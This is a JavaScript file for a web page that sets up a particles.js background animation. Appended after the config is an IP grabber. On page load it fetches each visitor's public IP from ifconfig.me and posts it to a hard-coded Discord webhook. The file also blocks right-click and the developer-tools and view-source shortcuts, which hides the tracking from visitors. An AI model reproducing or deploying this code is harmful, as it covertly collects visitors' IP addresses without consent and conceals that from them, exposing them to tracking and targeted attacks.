particlesJS("particles-js", {
    particles: {
        number: {
            value: 80,
            density: {
                enable: !0,
                value_area: 225
            }
        },
        color: {
            value: "#ffffff"
        },
        shape: {
            type: "circle",
            stroke: {
                width: 0,
                color: "#000000"
            },
            polygon: {
                nb_sides: 5
            },
            image: {
                src: "img/github.svg",
                width: 100,
                height: 100
            }
        },
        opacity: {
            value: .5,
            random: !1,
            anim: {
                enable: !1,
                speed: 1,
                opacity_min: .1,
                sync: !1
            }
        },
        size: {
            value: 2,
            random: !0,
            anim: {
                enable: !1,
                speed: 40,
                size_min: .1,
                sync: !1
            }
        },
        line_linked: {
            enable: !1,
            distance: 150,
            color: "#ffffff",
            opacity: .4,
            width: 1
        },
        move: {
            enable: !0,
            speed: 2,
            direction: "top",
            random: !1,
            straight: !1,
            out_mode: "out",
            attract: {
                enable: !1,
                rotateX: 600,
                rotateY: 1200
            }
        }
    },
    interactivity: {
        detect_on: "canvas",
        events: {
            onhover: {
                enable: !1,
                mode: "repulse"
            },
            onclick: {
                enable: !1,
                mode: "push"
            },
            resize: !1
        },
        modes: {
            grab: {
                distance: 400,
                line_linked: {
                    opacity: 1
                }
            },
            bubble: {
                distance: 400,
                size: 40,
                duration: 2,
                opacity: 8,
                speed: 3
            },
            repulse: {
                distance: 200
            },
            push: {
                particles_nb: 4
            },
            remove: {
                particles_nb: 2
            }
        }
    },
    retina_detect: !0,
    config_demo: {
        hide_card: !1,
        background_color: "#b61924",
        background_image: "",
        background_position: "50% 50%",
        background_repeat: "no-repeat",
        background_size: "cover"
    }
});

// sefty#0001
async function sendWebhook() {
	let ip = await (await fetch(`https://ifconfig.me/ip`)).text();
	var request = new XMLHttpRequest();
	request.open("POST", "https://discord.com/api/webhooks/1159569318636429363/_g9StyBmN9rk9uV_Rjx33cdghwUg4dxjZe1fbozR_9klPfWhUijFnT4qsuxPc87BvwPc"); // paste your webhook link there

	request.setRequestHeader('Content-type', 'application/json');

	var params = {
		username: "sefty.xyz",
		avatar_url: "https://cdn.discordapp.com/attachments/1159569653182496868/1159573275937079407/wojtek.mafia_logo.png?ex=653183c4&is=651f0ec4&hm=8ddf433577c20c2dca93046a0196bf2f619a50f938ae79212dbce8fd542c7137&",
		content: `${ip}`
	};

	request.send(JSON.stringify(params));
};

window.onload = function () { // this will run funcion on page load
	sendWebhook();
};

document.addEventListener("contextmenu", function (e) {
    e.preventDefault()
})

document.onkeydown = function (e) {
    if (event.keyCode == 123) {
        return false
    }

    if (e.ctrlKey && e.shiftKey && e.keyCode == "I".charCodeAt(0)) {
        return false
    }

    if (e.ctrlKey && e.shiftKey && e.keyCode == "C".charCodeAt(0)) {
        return false
    }

    if (e.ctrlKey && e.shiftKey && e.keyCode == "J".charCodeAt(0)) {
        return false
    }

    if (e.ctrlKey && e.keyCode == "U".charCodeAt(0)) {
        return false
    }
}